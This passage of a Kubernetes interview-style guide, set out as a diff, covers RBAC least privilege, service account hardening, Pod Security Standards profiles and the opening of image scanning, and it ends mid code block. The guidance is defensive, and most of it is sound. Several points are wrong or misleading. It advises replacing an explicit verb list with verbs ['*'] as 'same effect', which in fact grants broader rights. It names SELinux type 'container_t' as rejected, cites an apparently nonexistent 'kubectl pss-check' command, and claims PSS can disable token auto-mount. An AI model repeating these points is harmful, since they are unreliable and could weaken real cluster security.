+Only break-glass admins should have this. Even they should use it temporarily, not as their daily identity.
+
+**Best practice 3: Namespace-scoped Roles when possible**
+
+```yaml
+# Prefer:
+kind: Role           # Namespace-scoped
+namespace: prod
+
+# Over:
+kind: ClusterRole    # Cluster-wide
+```
+
+ClusterRoles needed only when:
+- Resources are cluster-scoped (Nodes, PVs)
+- Same access needed in multiple namespaces
+
+**Best practice 4: Specific resource names when possible**
+
+```yaml
+# Bad: any secret:
+rules:
+  - apiGroups: [""]
+    resources: ["secrets"]
+    verbs: ["get"]
+
+# Better: specific secrets:
+rules:
+  - apiGroups: [""]
+    resources: ["secrets"]
+    resourceNames: ["my-app-config"]
+    verbs: ["get"]
+```
+
+`resourceNames` limits to specific named resources.
+
+**Best practice 5: Avoid wildcard permissions**
+
+```yaml
+# Dangerous:
+rules:
+  - apiGroups: ["*"]
+    resources: ["*"]
+    verbs: ["*"]
+
+# Equivalent to cluster-admin
+```
+
+Always specify what you actually need.
+
+**Best practice 6: Use groups, not individual users**
+
+```yaml
+# Bad: per-user bindings (hard to manage):
+subjects:
+  - kind: User
+    name: alice
+  - kind: User
+    name: bob
+  - kind: User
+    name: charlie
+
+# Better: group binding:
+subjects:
+  - kind: Group
+    name: team-developers
+```
+
+Manage membership in identity provider (OIDC, AD), not in RBAC.
+
+**Best practice 7: Separate roles by function**
+
+```yaml
+# Don't combine:
+# - Read pods
+# - Write deployments
+# - Delete services
+# In one role
+
+# Separate:
+- Role: pod-reader (read pods)
+- Role: deployment-admin (manage deployments)
+- Role: service-admin (manage services)
+```
+
+Easier to audit and reason about.
+
+**Best practice 8: Use built-in ClusterRoles**
+
+Kubernetes provides:
+
+- `cluster-admin`: full access (avoid)
+- `admin`: full namespace access
+- `edit`: edit namespace resources (no RBAC)
+- `view`: read-only namespace access
+
+```yaml
+# Aggregate built-in:
+roleRef:
+  kind: ClusterRole
+  name: view   # Built-in read-only role
+```
+
+Often sufficient, well-tested.
+
+**Best practice 9: Service accounts per workload**
+
+```yaml
+# Each workload gets its own SA:
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: my-app
+  namespace: production
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: my-app-binding
+subjects:
+  - kind: ServiceAccount
+    name: my-app
+    namespace: production
+roleRef:
+  kind: Role
+  name: my-app-role
+```
+
+Not shared SAs. If compromised, limited blast radius.
+
+**Best practice 10: Disable default SA auto-mount**
+
+```yaml
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: default
+  namespace: production
+automountServiceAccountToken: false
+```
+
+Pods that don't need API access don't get tokens. Even if compromised, no Kubernetes API access.
+
+Or per-pod:
+
+```yaml
+spec:
+  automountServiceAccountToken: false
+```
+
+**Best practice 11: Audit regularly**
+
+```bash
+# Find cluster-admin bindings:
+kubectl get clusterrolebindings -o json | jq '.items[] | select(.roleRef.name=="cluster-admin")'
+
+# Find permissive roles:
+kubectl get clusterroles -o json | jq '.items[] | select(.rules[]?.verbs[]?=="*")'
+```
+
+Tools:
+- `kubectl-who-can`: who can do X?
+- `rbac-tool`: visualize permissions
+- `audit2rbac`: generate minimum RBAC from audit logs
+
+**Best practice 12: Use aggregated ClusterRoles**
+
+Compose roles:
+
+```yaml
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: monitoring-admin
+  labels:
+    rbac.example.com/aggregate-to-admin: "true"
+rules:
+  - apiGroups: ["monitoring.coreos.com"]
+    resources: ["*"]
+    verbs: ["*"]
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: admin   # Built-in
+aggregationRule:
+  clusterRoleSelectors:
+    - matchLabels:
+        rbac.example.com/aggregate-to-admin: "true"
+```
+
+The `admin` role auto-includes all roles with matching labels.
+
+**Best practice 13: Time-limited access**
+
+For sensitive operations:
+
+```bash
+# Generate short-lived token:
+kubectl create token my-sa --duration=1h
+```
+
+Or use external identity:
+- AWS STS: temporary credentials
+- HashiCorp Vault: dynamic credentials with TTL
+
+**Best practice 14: Separate human and automation**
+
+Humans:
+- Authenticated via OIDC
+- Per-user identity
+- Audit logs trace to specific person
+
+Automation:
+- ServiceAccount
+- Per-workload
+- Different controls and rotation
+
+Don't share between humans and automation.
+
+**Best practice 15: Document RBAC structure**
+
+```yaml
+# Why this role exists:
+metadata:
+  name: backup-operator
+  annotations:
+    description: "Allows backup pods to read all resources for backup purposes"
+    owner: "platform-team@example.com"
+```
+
+Future you (or successor) will thank you.
+
+**Common RBAC mistakes:**
+
+**Mistake 1: cluster-admin for CI/CD**
+
+```yaml
+# CI service account with full cluster access
+```
+
+If CI is compromised, cluster is compromised.
+
+Fix: scope to deployment namespaces, specific resources.
+
+**Mistake 2: Verb expansion**
+
+```yaml
+verbs: ["get", "list", "watch", "create", "update", "patch", "delete"]
+```
+
+That's effectively "all verbs". Use:
+
+```yaml
+verbs: ["*"]
+```
+
+Same effect, clearer intent. But better: only the verbs you need.
+
+**Mistake 3: Overuse of cluster-scoped resources**
+
+```yaml
+# A pod needs to read its own ConfigMap.
+# Don't:
+kind: ClusterRole
+rules:
+  - resources: ["configmaps"]
+    verbs: ["get"]
+
+# Do:
+kind: Role
+namespace: my-app
+rules:
+  - resources: ["configmaps"]
+    resourceNames: ["my-config"]
+    verbs: ["get"]
+```
+
+**Mistake 4: Granting "exec" without thought**
+
+```yaml
+verbs: ["create"]
+resources: ["pods/exec"]
+```
+
+Anyone with this can run commands in pods. Effectively shell access. Restrict carefully.
+
+**Mistake 5: Self-modifying RBAC**
+
+```yaml
+# A role that can modify roles:
+rules:
+  - apiGroups: ["rbac.authorization.k8s.io"]
+    resources: ["roles", "rolebindings"]
+    verbs: ["create", "update"]
+```
+
+Holder can grant themselves more permissions. Privilege escalation.
+
+**Production scenarios:**
+
+1. **Audit found 50+ cluster-admin bindings**: New cluster admin reviewed RBAC. Found dozens of bindings created over time. Audited each, removed 40+ unnecessary ones.
+
+2. **Service account compromise contained**: Web app pod had service account with namespace-scoped read-only. Compromised via SQL injection. Damage: read of one namespace's pods. Could have been catastrophic with broader permissions.
+
+3. **CI pipeline got cluster-admin**: Convenience setup. Compromised CI deployed crypto miners cluster-wide. Now: CI has only deploy permissions to specific namespaces.
+
+4. **OIDC + groups for clean RBAC**: Migrated from per-user bindings to OIDC groups. New employee joins group → automatic access. Leaves → automatic removal. Lower management overhead.
+
+5. **kubectl-who-can saved hours**: "Who can delete pods in production?" used to require reading many YAMLs. With kubectl-who-can, one command answer.
+
+---
+
+## 224. How do you secure service accounts?
+
+Service accounts authenticate workloads to the Kubernetes API. Misconfigured service accounts are a common attack vector.
+
+**What service accounts do:**
+
+Every pod has an identity for API server communication:
+
+```yaml
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: my-app
+  namespace: production
+```
+
+When a pod uses this SA, it gets a token mounted at:
+
+```
+/var/run/secrets/kubernetes.io/serviceaccount/token
+```
+
+Apps in pod use this token to make authenticated API calls.
+
+**Default service account problem:**
+
+Every namespace has a "default" SA. By default:
+- Pods auto-mount its token
+- Default SA in some clusters has unnecessary permissions
+- All pods without explicit SA use it
+
+```yaml
+# This pod uses "default" SA:
+spec:
+  containers:
+    - name: app
+      image: my-app
+```
+
+If compromised, attacker has whatever the default SA can do.
+
+**Best practice 1: Per-workload service accounts**
+
+```yaml
+# Dedicated SA for each app:
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: payments-app
+  namespace: production
+
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: payments-app
+spec:
+  template:
+    spec:
+      serviceAccountName: payments-app
+      containers:
+        - name: app
+          image: payments-app:v1
+```
+
+Each app has minimum permissions for what it actually needs. Compromise of one app doesn't grant permissions of others.
+
+**Best practice 2: Disable auto-mount when not needed**
+
+If your pod doesn't need API access:
+
+```yaml
+spec:
+  automountServiceAccountToken: false
+  containers:
+    - name: app
+      image: my-app
+```
+
+No token mounted. Even if compromised, no Kubernetes API access.
+
+Most application pods don't need API access. Only operators, controllers, and some monitoring need it.
+
+**Best practice 3: Minimal RBAC per SA**
+
+```yaml
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  name: payments-app
+  namespace: production
+rules:
+  - apiGroups: [""]
+    resources: ["configmaps"]
+    resourceNames: ["payments-config"]
+    verbs: ["get", "watch"]
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: payments-app
+  namespace: production
+subjects:
+  - kind: ServiceAccount
+    name: payments-app
+roleRef:
+  kind: Role
+  name: payments-app
+```
+
+Specifically: read one ConfigMap. Nothing else.
+
+**Best practice 4: Bound service account tokens**
+
+Modern Kubernetes (1.22+) supports projected tokens:
+
+```yaml
+spec:
+  serviceAccountName: my-sa
+  containers:
+    - name: app
+      volumeMounts:
+        - name: token
+          mountPath: /var/run/secrets/tokens
+  volumes:
+    - name: token
+      projected:
+        sources:
+          - serviceAccountToken:
+              path: my-token
+              expirationSeconds: 3600
+              audience: my-app
+```
+
+Benefits:
+- Token rotates automatically (every hour)
+- Bound to specific audience
+- Bound to pod (deleted with pod)
+
+Older tokens were long-lived, no audience binding.
+
+**Best practice 5: Disable default SA permissions**
+
+```yaml
+# Patch default SA to have zero permissions:
+# Don't bind any roles to it
+# Or explicitly remove permissions
+```
+
+If apps use default SA accidentally, they get nothing.
+
+**Best practice 6: Service account token rotation**
+
+By default, tokens live as long as the pod. For frequent rotation:
+
+```yaml
+spec:
+  containers:
+    - name: app
+      volumeMounts:
+        - name: token
+          mountPath: /var/run/secrets/tokens
+  volumes:
+    - name: token
+      projected:
+        sources:
+          - serviceAccountToken:
+              path: my-token
+              expirationSeconds: 600   # 10 minute tokens
+```
+
+Application must re-read token periodically. Most clients (client-go) do automatically.
+
+**Best practice 7: Cloud workload identity**
+
+Bind Kubernetes SA to cloud IAM:
+
+**AWS IRSA:**
+
+```yaml
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: my-app
+  annotations:
+    eks.amazonaws.com/role-arn: arn:aws:iam::123:role/my-app-role
+```
+
+Pod gets AWS credentials for that IAM role. No need to inject AWS access keys.
+
+**GCP Workload Identity:**
+
+```yaml
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: my-app
+  annotations:
+    iam.gke.io/gcp-service-account: my-app@project.iam.gserviceaccount.com
+```
+
+**Azure AD Pod Identity / Workload Identity:**
+
+Similar concept.
+
+Benefits:
+- No long-lived cloud credentials
+- IAM controlled by cloud
+- Automatic rotation
+
+**Best practice 8: Audit service account usage**
+
+Audit logs show which SA made which API calls:
+
+```yaml
+# audit-policy.yaml:
+rules:
+  - level: Metadata
+    users: ["system:serviceaccount:*:*"]
+    verbs: ["create", "update", "delete", "patch"]
+```
+
+Logs every write by any SA. Investigation easier.
+
+**Best practice 9: ServiceAccount-based NetworkPolicies**
+
+Not direct, but combine with labels:
+
+```yaml
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: payments-network
+spec:
+  podSelector:
+    matchLabels:
+      app: payments
+  ingress:
+    - from:
+        - podSelector:
+            matchLabels:
+              app: frontend
+```
+
+Indirect: pods with same labels have same network restrictions.
+
+**Best practice 10: Pod Security**
+
+Even if SA token is compromised, limit damage:
+
+```yaml
+spec:
+  securityContext:
+    runAsNonRoot: true
+    runAsUser: 1000
+  containers:
+    - name: app
+      securityContext:
+        readOnlyRootFilesystem: true
+        allowPrivilegeEscalation: false
+        capabilities:
+          drop: [ALL]
+```
+
+Defense in depth.
+
+**Common attack patterns:**
+
+**Attack 1: Default SA exploitation**
+
+Attacker compromises pod. Pod has default SA token mounted. Default SA has cluster-admin in misconfigured cluster.
+
+Result: Full cluster compromise.
+
+**Attack 2: SA token theft**
+
+Attacker finds SA token in compromised pod. Uses token from external attacker machine. Token is still valid.
+
+Result: Cluster access from anywhere with that token.
+
+**Defense:**
+- Short-lived tokens (projected with expiration)
+- Bound tokens (specific audience)
+- Network policies restricting where API calls come from
+
+**Attack 3: Operator with too much power**
+
+Custom operator needs to read pods, but has create/delete on all resources.
+
+Compromise of operator pod = compromise of cluster.
+
+**Defense:**
+- Minimum operator permissions
+- Audit operators on install
+
+**Attack 4: Sidecar leaking SA**
+
+Sidecar in pod can read SA token (same pod = same identity).
+
+Compromise sidecar = compromise app's identity.
+
+**Defense:**
+- Trusted sidecars only
+- For untrusted sidecars: different identity
+
+**Service account anti-patterns:**
+
+**Anti-pattern 1: Shared SAs**
+
+```yaml
+# Many deployments use:
+serviceAccountName: app-sa
+```
+
+Compromise of one = lateral movement.
+
+**Anti-pattern 2: Long-lived tokens**
+
+Static tokens that never rotate. If leaked, permanent backdoor.
+
+**Anti-pattern 3: Credentials in SAs**
+
+```yaml
+# Bad: Secret with token embedded:
+data:
+  token: <base64 long-lived token>
+```
+
+Treat as regular secret, not just inert config.
+
+**Anti-pattern 4: SAs with cluster-admin**
+
+Operators that need broad access get cluster-admin. Way more than needed.
+
+**Production scenarios:**
+
+1. **Default SA had cluster-admin**: Legacy cluster setup. All pods got cluster-admin. One pod compromise = cluster compromise. Fixed: default SA has zero permissions, per-pod SAs.
+
+2. **IRSA replaced AWS keys in pods**: Apps had AWS_ACCESS_KEY_ID in env vars. Static, long-lived. Migrated to IRSA. No static credentials, automatic rotation.
+
+3. **Operator with minimal RBAC**: Custom operator initially had cluster-admin. Audit reduced to specific CRD permissions + needed core resources. Compromise scope dramatically reduced.
+
+4. **Token rotation caught attack**: Logs showed SA token used from suspicious IP. Token was 1-hour projected token. By the time rotation happened, attacker locked out. Investigation found compromised pod.
+
+5. **automountServiceAccountToken=false**: Audit found 80% of pods didn't need API access but had tokens. Disabled auto-mount globally with PSS. Attack surface reduced.
+
+---
+
+## 225. Explain Pod Security Standards
+
+Pod Security Standards (PSS) define three levels of security for pods. They replaced the deprecated PodSecurityPolicy (PSP).
+
+**The three profiles:**
+
+**Privileged:**
+- No restrictions
+- Equivalent to running outside containers
+- For trusted system workloads
+
+**Baseline:**
+- Minimal restrictions
+- Prevents known privilege escalations
+- Default-friendly (most apps work)
+
+**Restricted:**
+- Heavily restricted
+- Hardened pods only
+- Current best practices
+
+**Enforcement:**
+
+Pod Security admission controller enforces standards at namespace level:
+
+```yaml
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: my-namespace
+  labels:
+    pod-security.kubernetes.io/enforce: restricted
+    pod-security.kubernetes.io/enforce-version: latest
+    pod-security.kubernetes.io/audit: restricted
+    pod-security.kubernetes.io/warn: restricted
+```
+
+Three modes:
+- **enforce**: rejected if violates
+- **audit**: logged but allowed
+- **warn**: warning shown but allowed
+
+Often start with audit/warn, move to enforce after fixing violations.
+
+**Baseline profile restrictions:**
+
+**No privileged containers:**
+```yaml
+# Rejected:
+spec:
+  containers:
+    - securityContext:
+        privileged: true
+```
+
+**No hostNetwork, hostPID, hostIPC:**
+```yaml
+# Rejected:
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+```
+
+**Limited hostPath:**
+- HostPath volumes restricted
+
+**No NET_RAW capability:**
+```yaml
+# Rejected:
+spec:
+  containers:
+    - securityContext:
+        capabilities:
+          add: ["NET_RAW"]
+```
+
+**AppArmor unconfined not allowed:**
+```yaml
+# Rejected:
+metadata:
+  annotations:
+    container.apparmor.security.beta.kubernetes.io/<container>: unconfined
+```
+
+**SELinux types limited:**
+```yaml
+# Rejected:
+securityContext:
+  seLinuxOptions:
+    type: "container_t"   # Or other unconfined types
+```
+
+**Seccomp must not be Unconfined:**
+```yaml
+# Rejected:
+securityContext:
+  seccompProfile:
+    type: Unconfined
+```
+
+**No sysctls outside allowed list:**
+Some sysctls allowed (e.g., `kernel.shm_rmid_forced`), most not.
+
+**Procmount must be default:**
+```yaml
+# Rejected:
+securityContext:
+  procMount: Unmasked   # Exposes more of /proc
+```
+
+**Restricted profile additional restrictions:**
+
+Everything in Baseline, plus:
+
+**Non-root execution required:**
+```yaml
+# Required:
+spec:
+  securityContext:
+    runAsNonRoot: true
+  containers:
+    - securityContext:
+        runAsNonRoot: true
+```
+
+**Privilege escalation not allowed:**
+```yaml
+# Required:
+containers:
+  - securityContext:
+      allowPrivilegeEscalation: false
+```
+
+**Restricted volume types only:**
+
+Allowed:
+- configMap, secret
+- emptyDir
+- persistentVolumeClaim
+- downwardAPI, projected
+- ephemeral
+
+Not allowed (without explicit permission):
+- hostPath, hostNetwork volumes
+- CSI ephemeral with specific drivers
+
+**Capabilities must be dropped:**
+```yaml
+# Required:
+containers:
+  - securityContext:
+      capabilities:
+        drop: ["ALL"]
+        add: ["NET_BIND_SERVICE"]   # Only this one allowed
+```
+
+**Must use seccomp:**
+```yaml
+# Required:
+securityContext:
+  seccompProfile:
+    type: RuntimeDefault   # Or Localhost
+```
+
+**Read-only root filesystem (recommended):**
+```yaml
+containers:
+  - securityContext:
+      readOnlyRootFilesystem: true
+```
+
+**User and group IDs:**
+```yaml
+securityContext:
+  runAsUser: 1000        # Must not be 0
+  runAsGroup: 1000
+  fsGroup: 1000
+```
+
+**Implementing PSS:**
+
+**Step 1: Audit existing workloads**
+
+```yaml
+metadata:
+  labels:
+    pod-security.kubernetes.io/audit: restricted
+    pod-security.kubernetes.io/warn: restricted
+```
+
+This logs violations but doesn't block. Discover what fails.
+
+**Step 2: Fix violations**
+
+Common fixes:
+
+- Add `runAsNonRoot: true`
+- Add `securityContext` with proper capabilities
+- Remove `privileged: true`
+- Use specific user IDs
+
+**Step 3: Enforce**
+
+Once compatible:
+
+```yaml
+metadata:
+  labels:
+    pod-security.kubernetes.io/enforce: restricted
+```
+
+**Per-namespace strategy:**
+
+Different namespaces, different profiles:
+
+```yaml
+# System namespaces: privileged (need it):
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: kube-system
+  labels:
+    pod-security.kubernetes.io/enforce: privileged
+
+# Application namespaces: restricted:
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: production
+  labels:
+    pod-security.kubernetes.io/enforce: restricted
+```
+
+**Restricted-compliant pod example:**
+
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: secure-pod
+spec:
+  securityContext:
+    runAsNonRoot: true
+    runAsUser: 1000
+    runAsGroup: 1000
+    fsGroup: 1000
+    seccompProfile:
+      type: RuntimeDefault
+  containers:
+    - name: app
+      image: my-app:v1
+      securityContext:
+        allowPrivilegeEscalation: false
+        readOnlyRootFilesystem: true
+        capabilities:
+          drop: ["ALL"]
+      volumeMounts:
+        - name: tmp
+          mountPath: /tmp
+  volumes:
+    - name: tmp
+      emptyDir: {}
+```
+
+Note:
+- Specific non-root user
+- Dropped all capabilities
+- Read-only root with writable /tmp
+- Seccomp default profile
+- No privilege escalation
+
+**Common violations and fixes:**
+
+**Violation: Container runs as root**
+
+```yaml
+# Bad:
+containers:
+  - image: nginx   # Defaults to root
+
+# Fix 1: Use rootless image:
+  - image: nginxinc/nginx-unprivileged
+
+# Fix 2: Specify user:
+  - image: nginx
+    securityContext:
+      runAsUser: 1000
+```
+
+**Violation: Privileged needed for old patterns**
+
+App needs to write to /etc, etc.
+
+**Fix:** make filesystem writable selectively:
+
+```yaml
+containers:
+  - securityContext:
+      readOnlyRootFilesystem: true
+    volumeMounts:
+      - name: etc-write
+        mountPath: /etc/nginx
+volumes:
+  - name: etc-write
+    emptyDir: {}
+```
+
+**Violation: hostNetwork**
+
+```yaml
+# Restricted disallows
+hostNetwork: true
+```
+
+**Fix:** use a Service instead, or move to privileged namespace if truly needed.
+
+**Violation: hostPath**
+
+```yaml
+volumes:
+  - name: data
+    hostPath:
+      path: /data
+```
+
+**Fix:** use PVC instead:
+
+```yaml
+volumes:
+  - name: data
+    persistentVolumeClaim:
+      claimName: my-pvc
+```
+
+**Migration strategy:**
+
+1. **Enable warn/audit mode** in all namespaces
+2. **Watch audit logs** for violations
+3. **Fix high-priority workloads first** (production)
+4. **Enforce baseline first**, then restricted
+5. **System namespaces**: typically need privileged
+
+**Tooling for PSS:**
+
+**kubectl-psp-util / pluto:**
+
+Check workloads against PSS:
+
+```bash
+kubectl pss-check --namespace production --profile restricted
+```
+
+**OPA Gatekeeper:**
+
+For more fine-grained control beyond PSS.
+
+**Kyverno:**
+
+Alternative policy engine with pre-built PSS policies.
+
+**Production scenarios:**
+
+1. **Restricted by default in new namespaces**: Platform team enforced restricted on all new namespaces. Existing got warned during migration. 90% of workloads passed without changes; 10% needed updates.
+
+2. **Privileged needed for system DaemonSets**: Calico, node-exporter, kube-proxy needed elevated privileges. Their namespaces stayed privileged. Application namespaces went restricted.
+
+3. **Audit mode revealed unexpected violations**: Set audit mode, found 30+ deployments using root, hostNetwork, or privileged. Most were unnecessary - they worked fine with restrictions after small changes.
+
+4. **PSS broke a vendor app**: Third-party app required root and writable filesystem. Vendor refused to fix. Used Baseline profile for that namespace, Restricted elsewhere.
+
+5. **PSS + OPA Gatekeeper combo**: PSS for standard restrictions. Gatekeeper for company-specific (image registry, labels). Comprehensive policy enforcement.
+
+---
+
+## 226. Difference between restricted, baseline, and privileged policies
+
+Pod Security Standards define three profiles with different security levels. Choosing the right one balances security with workload requirements.
+
+**Privileged profile:**
+
+**Purpose:** No restrictions. For trusted system workloads.
+
+**Use cases:**
+- CNI plugins (Calico, Cilium)
+- CSI drivers
+- node-exporter
+- Privileged Daemonsets
+- Cluster management tools
+
+**Restrictions:** None.
+
+**Risk:** Anything can run. Compromise = host compromise.
+
+**Where to use:**
+
+```yaml
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: kube-system
+  labels:
+    pod-security.kubernetes.io/enforce: privileged
+```
+
+Trusted system namespaces only.
+
+**Baseline profile:**
+
+**Purpose:** Prevent known privilege escalations, allow typical apps.
+
+**Use cases:**
+- Most application workloads
+- Legacy applications
+- Workloads needing some elevated permissions
+
+**Key restrictions:**
+- No `privileged: true`
+- No `hostNetwork`, `hostPID`, `hostIPC`
+- Limited capabilities (no SYS_ADMIN, etc.)
+- No unconfined AppArmor/SELinux/seccomp
+- Limited volume types
+
+**Risks mitigated:**
+- Container escape via privileged
+- Network namespace escape via hostNetwork
+- Process namespace access via hostPID
+
+**Risks remaining:**
+- Pods still run as root (unless app specifies otherwise)
+- Writable root filesystem allowed
+- Privilege escalation allowed
+
+**Where to use:**
+
+```yaml
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: legacy-apps
+  labels:
+    pod-security.kubernetes.io/enforce: baseline
+```
+
+For applications that haven't been hardened yet.
+
+**Restricted profile:**
+
+**Purpose:** Modern best practices for hardened workloads.
+
+**Use cases:**
+- New applications (cloud-native)
+- Compliance environments
+- Security-sensitive workloads
+
+**Adds to Baseline:**
+- Must run as non-root (`runAsNonRoot: true`)
+- No privilege escalation (`allowPrivilegeEscalation: false`)
+- Drop all capabilities (except NET_BIND_SERVICE)
+- Seccomp required (RuntimeDefault or Localhost)
+- Limited volume types (no hostPath)
+
+**Risks mitigated:**
+- Root containers
+- Privilege escalation via setuid binaries
+- Excess capability use
+- Most container escape vectors
+
+**Risks remaining:**
+- Application-level vulnerabilities
+- Misconfiguration
+
+**Where to use:**
+
+```yaml
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: production
+  labels:
+    pod-security.kubernetes.io/enforce: restricted
+```
+
+Default for application namespaces in security-conscious clusters.
+
+**Comparison table:**
+
+| Restriction | Privileged | Baseline | Restricted |
+|------------|------------|----------|------------|
+| Privileged container | ✅ Allowed | ❌ Denied | ❌ Denied |
+| HostNetwork/PID/IPC | ✅ Allowed | ❌ Denied | ❌ Denied |
+| HostPath | ✅ Allowed | ⚠️ Limited | ❌ Denied |
+| Capability additions | ✅ All | ⚠️ Limited | ❌ Only NET_BIND_SERVICE |
+| Run as root | ✅ Allowed | ✅ Allowed | ❌ Denied |
+| Privilege escalation | ✅ Allowed | ✅ Allowed | ❌ Denied |
+| Unconfined seccomp/AppArmor | ✅ Allowed | ❌ Denied | ❌ Denied |
+| Drop all caps required | ❌ No | ❌ No | ✅ Yes |
+| Read-only root FS | ❌ Optional | ❌ Optional | ⚠️ Recommended |
+
+**Profile selection criteria:**
+
+**Choose Privileged when:**
+- System workload needs host access
+- Network plugin needs host networking
+- Storage plugin needs device access
+- Build/CI tools requiring privileged Docker
+
+**Choose Baseline when:**
+- Legacy applications you can't easily change
+- Applications need to be root for legitimate reasons (binding ports < 1024 - though there's better way)
+- Stepping stone to Restricted (migrate over time)
+- Third-party software with constraints
+
+**Choose Restricted when:**
+- New applications (born compliant)
+- After hardening existing apps
+- Compliance requirements (CIS, NIST, PCI)
+- Cloud-native applications
+
+**Migration path:**
+
+```
+Privileged (no policy)
+   ↓ enable audit mode for Baseline
+Audit reveals violations → fix
+   ↓ enable enforce Baseline
+   ↓ enable audit mode for Restricted
+Audit reveals more violations → fix
+   ↓ enable enforce Restricted
+```
+
+Gradual migration.
+
+**Example: same workload at each profile:**
+
+**Privileged-tolerant pod (system DaemonSet):**
+
+```yaml
+apiVersion: v1
+kind: Pod
+spec:
+  hostNetwork: true
+  hostPID: true
+  containers:
+    - name: agent
+      image: monitoring-agent:v1
+      securityContext:
+        privileged: true
+      volumeMounts:
+        - name: hostfs
+          mountPath: /host
+  volumes:
+    - name: hostfs
+      hostPath:
+        path: /
+```
+
+Works in Privileged. Rejected in Baseline.
+
+**Baseline-compliant pod:**
+
+```yaml
+apiVersion: v1
+kind: Pod
+spec:
+  containers:
+    - name: app
+      image: my-app:v1
+      # Runs as root, but no privileged or host*
+      volumeMounts:
+        - name: data
+          mountPath: /data
+  volumes:
+    - name: data
+      persistentVolumeClaim:
+        claimName: my-data
+```
+
+Works in Baseline. Will be warned in Restricted (runs as root).
+
+**Restricted-compliant pod:**
+
+```yaml
+apiVersion: v1
+kind: Pod
+spec:
+  securityContext:
+    runAsNonRoot: true
+    runAsUser: 1000
+    runAsGroup: 1000
+    seccompProfile:
+      type: RuntimeDefault
+  containers:
+    - name: app
+      image: my-app:v1
+      securityContext:
+        allowPrivilegeEscalation: false
+        readOnlyRootFilesystem: true
+        capabilities:
+          drop: ["ALL"]
+      volumeMounts:
+        - name: tmp
+          mountPath: /tmp
+        - name: data
+          mountPath: /data
+  volumes:
+    - name: tmp
+      emptyDir: {}
+    - name: data
+      persistentVolumeClaim:
+        claimName: my-data
+```
+
+Works in Restricted. More secure but requires app to support non-root, read-only root.
+
+**Common challenges:**
+
+**Challenge 1: Apps that need root**
+
+Apps designed to run as root for various reasons:
+- Binding to port 80/443
+- Writing to /etc
+- Process management
+
+**Solutions:**
+- Use NET_BIND_SERVICE capability (allowed in Restricted)
+- Or run app on high port, use Service to map
+- Refactor to write to mounted volumes
+- Use nonroot variants of images (nginx-unprivileged)
+
+**Challenge 2: Apps with writable filesystem requirements**
+
+Apps that write to /var, /tmp during normal operation.
+
+**Solutions:**
+- Mount emptyDir at /tmp, /var/cache, etc.
+- App configuration to write elsewhere
+- Use specific writable paths only
+
+**Challenge 3: Privileged Docker-in-Docker**
+
+CI/CD that builds images often needs Docker-in-Docker (privileged).
+
+**Solutions:**
+- Use kaniko (no privileged required)
+- Use BuildKit with rootless mode
+- Use buildah, img
+- Separate privileged build namespace
+
+**Challenge 4: Vendor apps**
+
+Third-party that won't change.
+
+**Solutions:**
+- Use Baseline for those namespaces
+- Encapsulate with restrictions where possible
+- Pressure vendor to harden
+
+**Production scenarios:**
+
+1. **Tiered policy by namespace**: kube-system: privileged. System add-ons: baseline. Apps: restricted. Different security per workload type.
+
+2. **Restricted for all new apps**: Platform team policy: any new namespace starts with restricted enforce. Developers learned hardening upfront. Cleaner cluster security.
+
+3. **Baseline transition pain**: Tried restricted from start. Many violations. Migrated to baseline first, fixed apps over months, then restricted. Smoother path.
+
+4. **Privileged for legitimate system tool**: Custom GPU resource scheduler needed privileged for device access. Stayed in privileged namespace. Auditored that namespace closely.
+
+5. **Compliance required restricted**: PCI compliance audit required hardened workloads. Migrated payment service namespace to restricted. Documented exception for one legacy component.
+
+---
+
+## 227. How do you enforce image security?
+
+Container images are a major attack vector. Vulnerable images, malicious code, or compromised supply chains can compromise the cluster.
+
+**Image security risks:**
+
+- Known CVEs in base images
+- Outdated dependencies
+- Embedded secrets
+- Malicious code injection
+- Compromised registry
+- Image tampering in transit
+
+**Layered defense:**
+
+Defend at multiple points:
+
+**Layer 1: Build time**
+
+- Use minimal base images
+- Multi-stage builds
+- Scan during build
+- Sign images
+
+**Layer 2: Registry**
+
+- Private, secured registry
+- Access control
+- Vulnerability scanning
+- Image signing/verification
+
+**Layer 3: Deploy time**
+
+- Admission control
+- Signature verification
+- Allowed registries policy
+- Vulnerability gating
+
+**Layer 4: Runtime**
+
+- Runtime threat detection
+- Container behavior monitoring
+- Network monitoring
+
+**Image scanning:**
+
+**Build-time scanning:**
+
+```yaml
+# CI pipeline:
+- name: scan
+  image: aquasec/trivy:latest
+  script: trivy image --severity HIGH,CRITICAL my-app:v1
+```
+
+Tools:
+- **Trivy** (Aqua): simple, fast, popular
+- **Grype** (Anchore): comprehensive
+- **Clair**: scalable for registries
+- **Snyk**: commercial, broad coverage
+- **Twistlock / Prisma Cloud**: commercial
+
+**Scan results:**
+
+```json
+{
+  "vulnerabilities": [
+    {
+      "id": "CVE-2022-1234",
+      "severity": "HIGH",
+      "package": "openssl",
+      "version": "1.1.1k",
+      "fixed_version": "1.1.1l"
+    }
+  ]
+}
+```
+
+**CI gating:**
+
+```yaml
+# Fail build on critical CVEs:
+- name: scan
+  script: |
+    trivy image --severity CRITICAL --exit-code 1 my-app:v1
+```
+
+Critical findings block deployment.
+
+**Registry scanning:**
+
+Most registries can scan on push:
+- AWS ECR
+- GCP Artifact Registry
+- Azure Container Registry
+- Harbor
+- Docker Hub (paid)
+
+```bash
